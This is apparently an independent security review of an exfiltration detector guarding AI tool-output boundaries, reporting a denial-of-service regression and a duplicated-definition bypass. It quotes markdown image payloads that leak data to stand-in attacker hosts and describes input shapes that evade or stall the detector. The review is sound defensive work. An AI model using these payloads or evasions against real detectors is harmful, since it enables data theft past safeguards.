STATUS: DONE_WITH_CONCERNS

# T78 — independent review of T77 (the repair of T72#F-001, F-002, F-003 and the three majors on the auto-fetch floor)

Reviewer: independent (review-security-code + review-logic). I wrote none of the code, none of the
prior reviews, and none of T66's, T71's, T72's or T77's probes. Every verdict row below cites a probe
I ran myself with a raw log path and a SHA-256.

This is the ninth and final round on this detector. Per `RESIDUALS.md`, what I find is documented
rather than fixed **except** a blocker reproduced at a public boundary. **I found two such findings,
and they are the reason this reply is not DONE.** Both are reproduced at all four public boundaries.

## Scope

- Branch `codex/agent-first-core`; base commit `0bc6418fa1a038f8ec909cf949fecba077acf9a4`. Every file
  under review is **uncommitted** in the main checkout `/Users/Goodea/goodea/keryx`. No worktree was
  entered, no `cd` under `.claude/worktrees/`, no `git stash`, no git or flow state change of any kind.
- Artifacts read in full: `RESIDUALS.md`, `T72-review.md`, `T77-spec.md`, `T77-implementation.md`,
  `T77-viability.ts`, `review-security-code/SKILL.md`, `review-logic/SKILL.md`,
  `docs/requirements/keryx-agent-first-core/policies.md`, the flow's `acceptance-criteria.md`.
- Code read: `src/security/detect/exfil.ts` (the module header, the whole markdown machinery
  `:440-810`, the HTML loop's attribute branches, `detectExfil` `:1159-1535`),
  `src/security/detect/index.ts`, `src/security/redact.ts`, `src/mcp/dispatch.ts`, `package.json`,
  `bun.lock`.

### File hashes (SHA-256), start and end — **NO DRIFT**

| File | Start = End |
|---|---|
| `src/security/detect/exfil.ts` | `6ee2accef6c1c9e26f569360fce020ee05d620dafba0c2edd7992fdce1b5f65c` |
| `src/security/detect/exfil.test.ts` | `fcb41d991e4b2296b05ef459cb78883ffc2c915c454560a50f4c660b0d79e48f` |
| `src/security/detect/index.ts` | `a509312d76e7771ec5d9b059207019bde8736ebf26131bc82b595f838bd79c0d` |
| `src/security/redact.ts` | `b8e9d9a5ca35f78127096bd7f1880669859b6d1ebd6e30151070a4d75bd44b86` |
| `src/mcp/dispatch.ts` | `f1db21b0872c7bb46b4ac09819f9676ed0fd1609652f8caf978640497b6f6f18` |
| `docs/requirements/keryx-agent-first-core/policies.md` | `5645ed4e363b8b39eb66323b82238e25455aacf43765ec76d8a36015ca835151` |
| `fixtures/exfil/cases.json` | `2f131992fa84c7be3fd299641a0c36e48424c4bf678906b86052c338402eeb4f` |
| `package.json` | `326046945553208816c080e3bb60e1e167742e1256a4779e7a49850d9193e0c8` |
| `bun.lock` | `8395c9afd11c72c21ecabafc2748f2dc7e994183caf8c37aead6912577548eeb` |
| flow `acceptance-criteria.md` | `fc255c571b594e18e5517e9105b5b049407b97c5db2d9d58a48f98689f4f21c9` |
| `src/security/persistence-sinks.test.ts` | `f00899ef34d08b7c3cf2cbe5f083a4cbfb09feac1b49855897ed27976f716ad1` |

The three hashes T77 records as its **after** values are exactly my start values, so every measurement
below was taken against precisely the tree T77 delivered, and nothing moved under me. Records:
`.T78-hashes-start.txt` / `.T78-hashes-end.txt` in this directory (`diff` clean).

## Summary

| Severity | Count |
|---|---|
| blocker | 2 |
| major | 0 |
| minor | 2 |
| info | 1 |
| **total** | **5** |

**Everything T77 was dispatched to fix is genuinely fixed.** All three blockers and all three majors
are closed at the detector and at all four public boundaries; the new label condition is *actually
necessary* — I could not construct a document whose definitions make it exclude a resolvable span, and
a brute-force sweep of the whole BMP found zero counterexamples to the inequality it rests on; the
cubic path is gone; the eleven prior matrices are byte-identical in a now **four-way** agreement
(T66 / T72 / T77 / T78). The viability refutation is correct on its decisive axis, verified at
`package.json` and `bun.lock`.

What is not closed is two things neither T72 nor T77 looked for, both in the same mandatory floor:

1. **The performance cliff was moved, not removed (F-001, blocker).** T77 replaced a constant bound
   with a bound derived from "the document's own definitions" — and the document is written by the
   attacker. Every perf shape both rounds measured carried *no* reference definition, so
   `budget.maxLength === 0` short-circuited the label path before it allocated. Add one long
   `[ref]: URL` line and the path is quadratic again: **400 KB → 19 037.7 ms, exponent 2.00**, and
   **4.0–10.9 seconds at each of the four public boundaries on a 128 KB payload**. This is a
   regression against the pre-T77 tree, where the removed constant bounded it.
2. **A reference-image bypass eight rounds missed (F-002, blocker).** CommonMark: the *first*
   definition of a duplicated label wins. `detectExfil` builds `refs` with `Map.set`, so the *last*
   one wins — it masks the second definition and leaves the first, which is the one `marked` fetches.
   Six spellings reach the client with the attacker host present **and `redaction.state:"redacted"`**,
   which is worse than a plain release because the caller is told it was handled. Pre-existing (the
   committed tree has the same `set`), not introduced by T77.

---

## Stage 1 — one row per item in the dispatch

| # | Row | Verdict | What my own work found |
|---|---|---|---|
| 1a | Blocker 1: an image inside a link, in every spelling | **PASS** | `T72-md` `rendererConfirmedBypasses: []`, `clickGatedControlsFlagged: []`, `supersetViolations: 0`; `T72-boundary` `hostileLeakingCount: 0`, `leakingWithStateNone: []`, `hostileFullyClosed: 19`. I added eight nesting shapes neither round drove and all eight resolve correctly: `imageInLinkInLink` (two links deep), `imageInLinkMultiline`, `refImageInLink` (full reference image inside a link), `imageInLinkAngleDest`, `linkDescBracketRun`, `imageAfterLinkDest` (the skip-window boundary) are **closed and renderer-confirmed**; `imageInImageInLink` and `imageInsideLinkDest` are released and `marked` does not fetch them either, so both are correct. The asymmetry T77 derived — an image's description is alt text and IS skipped, a link's description is content and is NOT — is CommonMark's own rule and matches the oracle on every row I could construct. Evidence: `T78-md.log`, `T78-T72-md.log`, `T78-T72-boundary.log`. |
| 1b | Blocker 2: the bound is GONE, not raised; the condition is NECESSARY | **PASS** | The constant is gone; there is no length bound left. The replacement is `nonWhitespaceCount(span) <= maxKeyLength`, necessary iff `normalise(span).length >= nonWhitespaceCount(span)`. I attacked exactly that: (a) brute-forced every BMP code point plus a supplementary-plane sample for a character whose `toLowerCase()` is **shorter** — **0 found**; (b) checked `isCollapsibleSpace` against the `\s` that `normaliseLabel` collapses — **0 disagreements**; (c) checked `String.trim()` against the same class — **0 disagreements**. So the condition cannot exclude a span the lookup would have resolved. Measured: 998/999/1000/1200/4096 all flagged in full, shortcut and collapsed forms — **no cliff anywhere**; whitespace-inflated use against a short key, whitespace-inflated *definition*, newline-in-label, mixed tabs, NBSP and the dotted-capital-I (2-code-unit lowercase) are all closed and renderer-confirmed. The one exclusion I found is a **non-member**: `caseFoldSharpS` (`ẞ` vs `ss`) is released, and `marked` does not resolve it either. Evidence: `T78-md.log`. |
| 1c | Blocker 3: the cubic backtracking path is gone | **PARTIAL — the cubic path is gone; a NEW quadratic path was opened in its place (F-001)** | T72's three shapes are gone: `T72-perf` `shapesOverOneSecond: []`, `superLinearShapes: []`; `T72-perf2` ratios ~0. But the removal of `MAX_REFERENCE_LABEL` made the label path's cost a function of an attacker-chosen constant. Control `balancedNest_noDef` 200 KB = **49.9 ms**; the same bytes with one long `[ref]: URL` line = 400 KB → **19 037.7 ms, exponent 2.00**. Two more super-linear shapes (`openRunOneClose_withLongDef` 1.72, `bangOpenRunOneClose_withLongDef` 2.04). Evidence: `T78-perf.log`, `T78-boundary.log`. |
| 2a | Major: srcset decoding, masking still on raw bytes | **PASS** | All six `T72-srcset` rows `verdict=ok` under both the empty and the `["cdn.example.org"]` allowlist. The mask is correct in both directions: when decoding reveals a hidden boundary the **whole raw attribute value** is replaced (`<img srcset="[REDACTED:url]">`) and the offsets stay on raw bytes; when the comma counts agree, the per-candidate path is untouched and the *other* candidate's raw entity spelling survives byte-for-byte (`https://cdn.example.org/a.png 1x, [REDACTED:url] 2x`). `isExfilDestination` is a faithful split-out of `considerUrl`'s decision, and `considerUrl`'s own behaviour is unchanged. Evidence: `T78-T72-srcset.log`, `T78-md.log`. |
| 2b | Major: label normalisation at BOTH definition and use | **PASS** | `normaliseLabel` (`trim → collapse every `\s` run to one space → lowercase`) is called at the definition side (`:1185`) and the use side (`:805`) — the same function, so the two halves cannot drift. `T72-gates` `bypasses: []` (was `[srcsetCharrefComma, labelInnerWhitespace, labelNewlineInLabel]`). Independently: `wsInflatedUse`, `wsInflatedDef`, `newlineInLabel`, `tabInLabel`, `nbspInLabel` all closed and renderer-confirmed. The class is complete to the extent the oracle can settle it: entity spellings and `ẞ`/`ss` case folding are non-members because `marked` does not resolve them either. Evidence: `T78-T72-gates.log`, `T78-md.log`. |
| 2c | Major: the completeness sentence is now true | **PARTIAL** | `T72-doc.ts` (the reviewer's own, unmodified) reports `parity: true`, `docSaysCoveredButReleased: []`, `docSaysReleasedButFlagged: []`, `propertyFailures: []` over its 77 rows, where T72 measured five released rows and `parity: false`. `T77-doc.ts` reports `parity: true` over 24 more. Every claim I checked by hand is true as written, including the new one — *«ограничения на длину label нет: единственный критерий — определён ли такой label в самом документе»* — which is exactly what the code now does. **But** *«перечень полный, не пример»* is false again, for a row no existing probe enumerates: `![alt]` against a **duplicated** definition is in the covered list and is released (F-002). One further inaccuracy, over-flagging direction (F-004). Evidence: `T78-T72-doc.log`, `T78-T77-doc.log`, `T78-dup.log`. |
| 3 | Performance as a security property | **FAIL (F-001)** | T77's headline reproduces: `T72-perf` and `T72-perf2` both report `shapesOverOneSecond: []` and `superLinearShapes: []` on this machine, and the claimed 88.8 ms `balancedNest` is 49.9 ms here. The claim that fails is the **generalisation** — "no shape over a second across the reviewer's twelve plus seventeen new ones" — because all twenty-nine share a property neither round noticed: none carries a reference definition, so `budget.maxLength === 0` short-circuits the path both rounds were measuring. **Worst shape I found: `balancedNest_withLongDef` — one 200 000-char `[ref]: URL` line plus `"[".repeat(100000) + "]".repeat(100000)`, 400 029 bytes, 19 037.7 ms, growth exponent 2.00.** At the boundaries, a 128 029-byte payload costs `dispatchCallTool` 4 332.4 ms, `prepareOutputForPersistence` 10 865.8 ms, `validateOutputForTransport` 5 550.2 ms, `redactToolOutput` 4 042.4 ms — **all four over a second**. ~90 KB crosses one second; 256 KB costs 21.2 s. Evidence: `T78-perf.log`, `T78-boundary.log`. |
| 4 | Nothing regressed | **PASS, and the corpus explanation is wrong in its detail while right in its substance (F-003)** | All **eleven** matrices re-run by me are byte-identical to the hashes T72 recorded **and** to the ones T77 recorded — a four-way agreement across three rounds, not a self-comparison: `T42-exfil-attack 0646c508…`, `T24-recheck2-exfil 8c9bfec0…`, `T42-charrefs 698d8899…`, `T53-extract ad20286b…`, `T53-resolve 06037910…`, `T53-base 3416d62e…`, `T53-boundary 398012ce…`, `T42-boundary 7030455d…`, `T24-recheck2-boundary 83839962…`, `T52-base a04404db…`, `T46-surfaces d8348c99…`. Focused suites **109 pass / 0 fail / 1110 expect()**, exit 0 — T77's exact numbers. Benign corpus **16 files / 62 findings**, the same 16 files, no new policy id, Part B the same 7 ids; the +2 is confined to the two worktree copies of the repository's own `fixtures/exfil/cases.json`, each 2 → 3, confirmed against T72's own raw log. **The explanation's substance holds** — it is T72#F-001's link-description rule firing on the repo's own attack fixture, a genuine vector previously released, and no ordinary file moved. **The vector is misidentified** (F-003): it is not `ex09-image-1x1-tracker` but the line-4 image `https://evil.example.com/collect?d=SECRETDATA`. Evidence: `T78-*.log`, `T78-T53-corpus.log`, `T78-corpus.log`, `T78-suites.log`. |
| 5 | The viability study | **PASS on the decisive axis, verified independently** | `package.json:59` — `"dependencies": {}`; `marked` appears in `dependencies`, `optionalDependencies` and `devDependencies` **zero times**. `bun.lock:374` declares `marked@17.0.1`, and `bun.lock:68` shows its only path into this checkout: `"@opentui/core@0.4.5" … "dependencies": { … "marked": "17.0.1" … }`, and `package.json:60-64` lists `@opentui/core` under **`optionalDependencies`**. `scripts.build` passes `--external @opentui/core` and `files` ships `dist` only, so the published artifact resolves it through that optional tree at runtime or not at all. An `import` in this module therefore throws at **module load** wherever the optional dependency was skipped, taking `detectExfil`'s importers — and with them all four public boundaries — down with it. **The refutation is correct, and it is correctly identified as dispositive on its own.** I did not re-measure axes 1–3; they are not load-bearing once axis 0 fails, and axis 0 is a fact about two files I read directly. |

---

## Judgement calls

### 1. Is a denial of service in this floor "blocking-and-reproduced" under the recorded decision?

`RESIDUALS.md`'s exception is *«находка со степенью blocker, воспроизведённая на публичной границе …
она означает работающий обход в обязательном слое»*. A cliff is not literally an *обход*. I am
classifying F-001 as blocking-and-reproduced anyway, for three stated reasons rather than by
stretching the word: the flow's own acceptance criteria name *«no pathological input inside the
floor»* as a criterion in its own right; the dispatch states that a bypass and a denial of service in
this floor are both security defects; and T72 classified the identical class (F-003) as a blocker and
T77 accepted that classification and fixed it. Treating the same defect as documentation-grade one
round later because it re-entered by a different door would make the residual list untrustworthy,
which is the thing this review is asked to prevent.

### 2. F-001 is a REGRESSION, and that is what makes it different from the eight rounds before it

The pre-T77 tree bounded this path at 999 characters, so `longLabelUse` measured 3.1 ms at 400 KB.
T77 removed the constant — correctly, because it released a vector — and replaced it with a bound
"derived from the input itself". The discipline is right and I would not want it reversed. What was
missed is that *the input is the attacker's*: a bound read out of the payload is not a fact about the
world, it is a value the adversary writes. T77's own text says the short-circuit "removes the cost the
constant was also there for" — it removes it only for documents with **no** definitions, which is
every shape both rounds measured and none an attacker would send. This is worth stating plainly for
the next round, because "replace the invented constant with a fact from the document" is otherwise
exactly the right lesson and will be applied again.

### 3. The image-inside-an-image rule (T77's Concern 3) is correctly labelled

T77 flags it as "the one place this round chose the narrower reading", derived from one renderer. My
`imageInImageInLink` row confirms `marked` renders only the outer destination and the detector
releases the inner one. Narrowing is the direction that costs coverage, so the disclosure is the right
call and the labelling is honest. **Accept, as recorded.**

---

## Findings

### F-001 — blocker — the label budget is attacker-chosen, so one `[ref]: URL` line restores a quadratic path in the mandatory floor

- **file / line / symbol**: `src/security/detect/exfil.ts:672-680` (`labelWithinBudget`), applied at
  `:802` and read from `:1182-1201` (`maxLabelLength` → `LabelBudget.maxLength`); the cost is paid in
  `readBracketConstructs` `:805` (`normaliseLabel(content.slice(labelStart, labelEnd))`).
- **problem**: `budget.maxLength` is the longest key **this document's own** `[ref]: URL` lines
  produced, and the document is the attacker's payload. When it is 0 the reference path
  short-circuits at `:779` before it slices — which is the case in **every** perf shape T72 (12) and
  T77 (17) measured. One long definition raises it arbitrarily, and then every opening bracket whose
  span passes the O(1) budget check is sliced, `\s+`-replaced and lowercased at O(span). In a bracket
  run the spans are O(n) and there are O(n) of them, so the pass is quadratic — and it is paid
  **twice**, because the inline pass at `:1247` also calls `readBracketConstructs` and then discards
  every reference construct it built (`.find((construct) => construct.kind === "inline")` never reads
  them). The `!` gate that would make that work unnecessary is at `:1335`, *after* the constructs are
  built.
- **impact**: measured on the shipped detector. Control `balancedNest_noDef` 200 000 bytes = **49.9 ms**;
  **`balancedNest_withLongDef` 400 029 bytes = 19 037.7 ms, growth exponent 2.00**. Also
  `openRunOneClose_withLongDef` (exponent 1.72) and `bangOpenRunOneClose_withLongDef` (2.04). At the
  four public boundaries, on one 128 029-byte payload: `dispatchCallTool` **4 332.4 ms**,
  `prepareOutputForPersistence` **10 865.8 ms**, `validateOutputForTransport` **5 550.2 ms**,
  `redactToolOutput` **4 042.4 ms** — all four over a second. ~90 KB crosses one second; 256 029 bytes
  costs **21 157.2 ms**. A prose-shaped variant (a sentence-shaped 32 000-char label plus a
  table-of-contents bracket run, 64 036 bytes) costs 1 129 ms. The floor is mandatory, cannot be
  skipped, and the payload is attacker-chosen. It is also a **regression**: the removed
  `MAX_REFERENCE_LABEL` bounded this path, and T72 measured the same `longLabelUse` shape at 3.1 ms.
- **reproduction**: `bun …/T78-perf.ts` → `shapesOverOneSecond: [balancedNest_withLongDef,
  openRunOneClose_withLongDef, bangOpenRunOneClose_withLongDef]`, `superLinearShapes` with exponents
  2.00 / 1.72 / 2.04, and the `_noDef` controls flat (raw `T78-perf.log`).
  `bun …/T78-boundary.ts` → `boundariesOverOneSecond` = all four (raw `T78-boundary.log`).
- **suggested_fix**: three changes, in increasing order of how much they buy. (a) Move the `!` gate
  before the work: the inline pass never reads a reference construct, and the reference pass discards
  them for non-image opens, so `readBracketConstructs` should not build them unless the caller wants
  them — this alone removes the two `[`-run shapes. (b) Tighten the necessary condition from "at most
  `maxKeyLength`" to "**exactly** a length some key has": the normalised length of a span is O(1) from
  two prefix arrays (the existing non-whitespace count, plus a count of whitespace-run starts), and a
  `Set` of key lengths then admits at most one candidate span per description end instead of all of
  them. (c) If a residual shape survives (b), give the label path a per-document work budget
  proportional to `content.length` and, when it is exhausted, **flag rather than release** — a cost
  bound whose failure direction is a finding, which is the direction this floor may move in. Then add
  a definition-carrying variant of every existing perf shape to `T77-perf.ts`, because the absence of
  one is what let this through.
- **class_scope**: sites: `src/security/detect/exfil.ts:672-680` (the budget test), `:779` (the
  `maxLength === 0` short-circuit that hides it), `:789-807` (the slice/normalise the budget gates),
  `:1247-1253` (the inline pass building reference constructs it discards), `:1313-1335` (the `!`
  gate placed after the work). Enumeration method: every O(1)-gated allocation in the two markdown
  passes was located by reading `readBracketConstructs` and both callers line by line, and each was
  asked "what makes the gate cheap, and is that thing under the attacker's control?". There is exactly
  one such gate (`LabelBudget`) and exactly one thing it is derived from (`REFERENCE_DEF` matches in
  the payload). Seven shapes were then scaled across four sizes each with the growth exponent computed
  per shape, in matched `_noDef` / `_withLongDef` / `_shortDef` triples so the *cause* is isolated and
  not merely the effect: `_shortDef` (budget 4) is flat at 17.7 ms, which is what proves the budget
  itself — not the bracket run — is the variable.

### F-002 — blocker — a duplicated reference definition releases the destination a renderer fetches, at all four boundaries, with `state:"redacted"`

- **file / line / symbol**: `src/security/detect/exfil.ts:1189` (`refs.set(ref, { url, start })` inside
  the definition loop `:1183-1192`), consumed at `:1338` (`refs.get(construct.label)`).
- **problem**: CommonMark §"Link reference definitions": *"If there are several matching definitions,
  the first one takes precedence."* The table is a `Map` and every match calls `set`, so the **last**
  definition wins. The finding's masked span is that last definition's URL (`def.start`). A document
  that defines the same label twice therefore has its **second** definition masked while a renderer
  resolves and fetches the **first**. Neither half of the pair is a spelling trick: both are ordinary
  reference definitions, and the detector reports a finding, so nothing looks wrong to the caller.
- **impact**: six spellings measured, all renderer-confirmed with `marked` and all leaking at
  **all four** public boundaries — `dispatchCallTool`, `prepareOutputForPersistence`,
  `validateOutputForTransport`, `redactToolOutput` — with `attacker.invalid` present in the output:
  shortcut `![a]`, full `![a][a]`, collapsed `![a][]`, a case-differing duplicate (`[A]:` then `[a]:`),
  a whitespace-differing duplicate (`[b  c]:` then `[b c]:`, which the T72#F-005 fix newly makes
  collide), and three definitions. This is **worse than a plain release**: `redaction.state` is
  `"redacted"` and `isError` is false at every boundary, so the caller is told the payload was
  handled while the zero-click destination is still in it. The control `c1SingleDef` is closed, so the
  defect is specific to duplication. It is **pre-existing** — `git show HEAD:src/security/detect/exfil.ts`
  has the same `refs.set` at `:99` — so it is a gap eight rounds of enumeration missed, not a T77
  regression; the T72#F-005 whitespace fix does widen the set of documents that can collide.
  It also falsifies `policies.md:28`'s *«перечень полный, не пример»* for the reference forms.
- **reproduction**: `bun …/T78-md.ts` → `bypasses: [dupFirstAttacker, dupFirstAttackerAllowlisted]`,
  each printing `marked`'s emitted `<img src="https://attacker.invalid/…">` beside a redacted output
  that still contains the attacker host (raw `T78-md.log`). Boundaries: `bun …/T78-dup.ts` →
  `leakingAtAnyBoundary: [d1ShortcutDupDef, d2FullDupDef, d3CollapsedDupDef, d4DupDefCaseSpelling,
  d5DupDefWhitespaceSpelling, d6ThreeDefs]`, `leakingCount: 6`, every row `mcpState:"redacted"` with
  `mcpLeaksAttacker/persistLeaksAttacker/transportLeaksAttacker/seamLeaksAttacker: true` (raw
  `T78-dup.log`).
- **suggested_fix**: keep the **first** definition, which is both CommonMark's rule and the safe
  direction — `if (!refs.has(ref)) refs.set(ref, { url, start })`. That is one line and matches the
  renderer. If over-approximating is preferred instead (a duplicate is itself suspicious), flag
  **every** definition of a label that any image use resolves, by making the table's value a list and
  pushing one finding per entry; that costs a masked destination in a document with an accidental
  duplicate and closes the class in every renderer, not only CommonMark-conformant ones. Either way
  add a duplicate-definition row to `T71_CLASS_VECTORS` / `T77_CLASS_VECTORS`, since no boundary
  regression currently reaches it, and re-check `maxLabelLength`, which is computed over all
  definitions and is therefore unaffected.
- **class_scope**: sites: `src/security/detect/exfil.ts:1183-1192` (the definition table loop),
  `:1338-1348` (the single-`def` lookup and the single finding it pushes),
  `docs/requirements/keryx-agent-first-core/policies.md:28` (the completeness claim over the three
  reference spellings). Enumeration method: every place the detector builds a *collection* keyed by
  attacker-supplied text was enumerated (there is exactly one: `refs`), and each was checked against
  the corresponding CommonMark or HTML precedence rule for what happens on a **collision** —
  first-wins, last-wins, or all. The markdown table is last-wins where the standard is first-wins.
  The HTML side's analogous case, a duplicate attribute, is resolved *eagerly* (any spelling opens the
  gate — `readStartTag`'s documented over-approximation, and T66#F-008), which is the safe direction;
  the markdown table is the one that is not. Six spellings then driven through `marked` and the four
  boundaries.

### F-003 — minor — `T77-implementation.md` names the wrong vector for the benign corpus's +2

- **file / line / symbol**: `.metaproject/flows/…/artifacts/T77-implementation.md`, §"The benign
  corpus" (and Concern 4).
- **problem**: T77 states the two extra findings are *"the SAME vector, `ex09-image-1x1-tracker`
  (`![ ](https://c2.example-attacker.com/1x1.gif?leak=Y)`) … which was being **released** because a
  surrounding bracket pair in the JSON made it an image inside a link's description"*. Measured: the
  only span the T77 change newly scans is a **link's description**, and `ex09` is at offset 1757 while
  **no** inline construct in the fixture spans it — `T78-corpus.ts` enumerates every `[` and both of
  its description ends and reports `enclosingInlineConstructsContainingEx09: 0` for both worktree
  copies. `ex09` was already flagged before. The vector that actually changed is the **line-4** image,
  `https://evil.example.com/collect?d=SECRETDATA`: the JSON array's own `[` at offset 332 resolves,
  through the first-`]` reading, to an inline **link** whose destination is that URL and whose
  construct ends at 499, and the image open `![status]` at offset **444** lies inside `[332, 499)` —
  exactly the span the pre-T77 code skipped and T77 no longer does.
- **impact**: none on any verdict — the count, the two files, the direction and the conclusion ("no
  ordinary file became a finding, no new benign carrier, no new policy id") are all confirmed by my
  own run, and the finding is a genuine attack vector previously released. Recorded because
  `T77-implementation.md` is what the next round inherits as the settled account of the +2, and
  because the *mechanism* it states — an image inside a link's **description** in the JSON — is not
  what happened; the enclosing construct is one the JSON's array bracket forms with a `]` inside a
  case string, which is a more interesting artefact of context-blind scanning than the narrative
  suggests.
- **reproduction**: `bun …/T78-corpus.ts` → `explanationHolds: false`,
  `enclosingInlineConstructsContainingEx09: 0`, `ex09Start: 1757` for both copies (raw
  `T78-corpus.log`); the array-bracket construct at `arrayOpen: 332 → constructEnd: 499` with
  `imageOpensInsideThatConstruct: [{ at: 444, … "![status](https://evil.example.com/collect?d=SECRETDATA)" }]`.
  Counts: `T78-T53-corpus.log` (16 files / 62 findings, Part B 7 ids) against
  `T72-rerun-T53-corpus.log` and `T77-before-T53-corpus.log` (both 16 / 60, both showing the two
  `cases.json` copies at 2).
- **suggested_fix**: correct the vector name and the mechanism in `T77-implementation.md`'s corpus
  section and Concern 4. No code change.

### F-004 — minor — the gate values are decoded REPEATEDLY, and `policies.md` says they are decoded "as the renderer decodes them"

- **file / line / symbol**: `src/security/detect/exfil.ts:256-266` (`decodeCharacterReferences`, a
  bounded repeat loop), read by `hasAttributeValue` `:911-921`;
  `docs/requirements/keryx-agent-first-core/policies.md:32`.
- **problem**: `policies.md:32` says the two attribute gates' values *«сравниваются после
  декодирования character references, как их декодирует renderer»* — "as the renderer decodes them".
  A conformant tokenizer decodes an attribute value **once**. `decodeCharacterReferences` loops to a
  fixed point (`MAX_DECODE_PASSES`), which is deliberate and documented in the code for the *URL*
  path, but it also reaches the two gates. Measured: `<input type="&amp;#105;mage" src=…>` and
  `<meta http-equiv="&amp;#114;efresh" content=…>` are both flagged, and neither opens the gate in any
  renderer — `&amp;#105;mage` decodes once to the literal text `&#105;mage`.
- **impact**: over-approximation, i.e. the safe direction — a masked destination in markup no renderer
  fetches. No bypass. It matters only because this subsection is the one a reader is told is
  checkable in both directions, and because the module header at `:94-101` presents the gate decoding
  as renderer-faithful without saying it is multi-pass. T72 measured the same two rows
  (`T72-extra.log` `doubleEncoded` / `doubleEncodedMeta`, `rendererGateOpen=false detectorFindings=1`)
  and did not raise them.
- **reproduction**: rows `gateDoubleEncoded` and `metaDoubleEncoded` — `detectExfil` returns 1 finding
  each; `decodeCharacterReferences` at `:256-266` is a loop, and `exfil.ts:254-255` says so.
- **suggested_fix**: state the multi-pass decode in `policies.md:32` and in the module header as the
  deliberate over-approximation it is ("decoded to a fixed point, which is wider than a renderer and
  errs toward flagging"), or restrict the gates to a single pass while leaving the URL path's repeat
  intact. Documentation is the cheaper of the two and matches the current direction.

### F-005 — info — the honesty labelling in `T77-implementation.md` Part 3 is accurate, and one adjacent claim in the module header is wider than its evidence

- **file / line / symbol**: `.metaproject/flows/…/artifacts/T77-implementation.md` §"T72#F-008" and
  Concerns 1–2; `src/security/detect/exfil.ts:118-132` (the oracle block).
- **problem / assessment**: both audited claims are **accurate**. (1) *"`marked` cannot confirm the
  three srcset rows"* — correct and correctly volunteered: `marked` emits no `<img>` for raw HTML, so
  no markdown oracle can see the srcset split; the finding rests on HTML Standard §13.2.5.35-.39 plus
  "parse a srcset attribute", exactly as stated, and the module header at `:118-132` says the same
  thing in the code where the next round will read it. Nothing in the module claims renderer
  confirmation for those rows. (2) *"nesting beyond one level is over-approximation no oracle can
  settle"* — correct: `marked` resolves one level, the depth-2..6 rows are flagged deliberately, the
  direction is toward flagging, and the alternative (a depth bound) is the failure mode this file's
  own history argues against. The one thing wider than its evidence is adjacent rather than in either
  claim: the header's decoding paragraph presents the gates as spelling-independent "the way the
  destinations are" without noting the multi-pass decode (F-004), and `T77-implementation.md`'s Part 3
  table says the markdown question is *"Settled by measurement"* — true of the rows enumerated, and I
  extended those rows by eight nesting shapes and thirteen label shapes without finding a
  counterexample, but F-002 shows the enumeration itself was incomplete, so "settled" describes the
  rows, not the surface. That distinction is the one the next round should carry forward.
- **impact**: none on any verdict.
- **suggested_fix**: none required. When F-002 is fixed, say "settled for the enumerated rows" rather
  than "settled by measurement", and name the enumeration.

---

## Residual classification

| Finding | Severity | Reproduced at a public boundary? | Classification under the `RESIDUALS.md` decision |
|---|---|---|---|
| F-001 — attacker-chosen label budget restores a quadratic path | blocker | **Yes — all four**, 4.0–10.9 s each on 128 KB | **BLOCKING-AND-REPRODUCED — must be fixed now.** It is the exception the recorded decision names: a blocker measured at the public boundaries of a mandatory floor. It is additionally a **regression** against the pre-T77 tree, so leaving it documented would ship the phase in a worse state than the round it reviewed. |
| F-002 — duplicated reference definition releases the fetched URL | blocker | **Yes — all four**, 6 spellings, host present with `state:"redacted"` | **BLOCKING-AND-REPRODUCED — must be fixed now.** A working bypass in the mandatory floor, renderer-confirmed, at the default empty allowlist. This is the exception in its literal form. The one-line first-wins fix is available and no test pins the current behaviour. |
| F-003 — the corpus +2 names the wrong vector | minor | No (an artifact, not code) | **DOCUMENTATION-GRADE.** Append to `RESIDUALS.md`. The substance of T77's account is confirmed; only the vector name and mechanism are wrong. |
| F-004 — multi-pass gate decoding vs the "as the renderer decodes" sentence | minor | No (over-flagging direction) | **DOCUMENTATION-GRADE.** Append to `RESIDUALS.md` beside T66#F-008 (`inputDupTypeTextFirst`), which is the same class: an over-approximation in the safe direction that the normative text does not disclose. |
| F-005 — the honesty audit itself | info | n/a | **DOCUMENTATION-GRADE.** No action beyond the wording note. |

**Consequence for `policies.md`.** `«перечень полный, не пример»` is false again while F-002 is open,
for one row (`![alt]` against a duplicated definition). It becomes true again when F-002 is fixed; it
does **not** need a named-exception list if F-002 is fixed this round, and `Version:` should be bumped
`0.1.4 → 0.1.5` only if the sentence changes.

**What the next round should NOT re-open.** The three T72 blockers and three T72 majors are closed and
independently re-measured; the eleven matrices are in four-way byte agreement; the new label condition
is necessary and has no cliff; the viability refutation is correct. Re-deriving any of these is waste.

## Honesty audit

**Claim 1 — "the runtime's HTML rewriter cannot adjudicate a decoding question, so three srcset rows
rest on the specification alone and are not renderer-confirmed."** **Accurate, and volunteered rather
than extracted.** It is stated in three places that a future round will actually read: the module
header (`exfil.ts:118-132`), `T77-spec.md`'s oracle section, and `T77-implementation.md` Part 3's
per-question table, which names the oracle for each question and writes **"none in this checkout"**
where there is none. The specific row label is exact —
`rendererFetchesOnCoveredRows: srcsetDecodedComma=false` in `T77-doc.log` — so the artifact does not
merely assert the limitation, it records the row that shows it. My own `T78-T72-srcset.log` and the
masking rows confirm the *behaviour* is right; I agree no oracle in this checkout can confirm the
*premise*, and I did not invent one.

**Claim 2 — "nesting beyond one level is over-approximation no oracle can settle."** **Accurate.**
`marked` resolves one level; the depth-2..6 rows are flagged deliberately; the direction is toward
flagging; the alternative is a depth bound, which is the failure mode this file's history argues
against. T77 kept T71's behaviour and T72's acceptance unchanged and did not re-label it as
confirmed.

**Anything else presented as confirmed when it is not?** Two things, both recorded above and neither
severe. (a) `policies.md:32` says the gate values are decoded "as the renderer decodes them"; they are
decoded to a fixed point, which no renderer does — over-flagging, F-004. (b) `T77-implementation.md`'s
corpus section states a mechanism for the +2 that measurement does not support and names the wrong
vector — F-003. Against those: T77's Concerns list is unusually honest, and three of its seven entries
(the srcset oracle, the depth over-approximation, the `Version:` bump outside its subsection) are
things a less careful round would have left for a reviewer to find. The performance claim
("`shapesOverOneSecond: []` across 29 shapes") is **not** dishonest — every number reproduces on this
machine; it is an over-generalisation from a shape family that shares a hidden property, which is the
same failure T72 named in T71 and is the substance of F-001, not of this audit.

## Confirmed clean areas

- **T72#F-001 is fully closed**, including eight nesting shapes neither prior round drove, and the
  asymmetry it rests on (image description = alt text, skipped; link description = content, scanned)
  matches `marked` on every row I could construct in both directions.
- **T72#F-002 is fully closed and the replacement condition is genuinely NECESSARY** — 0 counterexamples
  across the BMP plus a supplementary-plane sample, 0 whitespace-class disagreements, 0 `trim`
